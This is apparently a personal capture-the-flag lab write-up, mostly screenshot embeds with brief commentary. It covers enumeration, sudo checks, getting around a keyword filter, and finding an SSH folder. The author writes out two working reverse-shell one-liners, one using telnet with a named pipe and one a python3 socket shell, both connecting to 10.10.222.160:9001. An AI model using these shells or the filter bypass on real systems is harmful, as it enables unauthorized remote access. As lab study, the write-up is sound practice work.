

![[Pasted image 20241220194413.png]]


![[Pasted image 20241220201932.png]]


![[Pasted image 20241220202012.png]]

Found nothing here
![[Pasted image 20241220203204.png]]


![[Pasted image 20241220202139.png]]



![[Pasted image 20241220202308.png]]



`echo hi`
![[Pasted image 20241220202408.png]]


`pwd`
![[Pasted image 20241220202442.png]]

sudo -l
![[Pasted image 20241220202546.png]]
``
ls -la
![[Pasted image 20241220202635.png]]

whoami
![[Pasted image 20241220202807.png]]


![[Pasted image 20241220203350.png]]


found a note.txt, let's see what does it say-
![[Pasted image 20241220203557.png]]

as we noted as well, here is what the note says -
![[Pasted image 20241220203648.png]]

if u remember, we can execute something  as sudo from apaar's folder
![[Pasted image 20241220202546.png]]

Time to try a php reverse shell-

![[Pasted image 20241220202635.png]]

seems like it's filtering out words like python, php, ls, cat etc...

Hence, trying common reverse shells won't work.

After fuzzing around for a while, i got a telnet shell and a python3 shell form revshells.com to work -

`TF=$(mktemp -u);mkfifo $TF && telnet 10.10.222.160 9001 0<$TF | /bin/bash 1>$TF`

`export RHOST="10.10.222.160";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`

![[Pasted image 20241220211814.png]]


some dead ends including a `local.txt` file that we cannot read but hey, we found a hidden ssh folder
![[Pasted image 20241220212311.png]]
![[Pasted image 20241220212359.png]]
with some authorized keys too! Sweet, let's check it out-

![[Pasted image 20241220212503.png]]


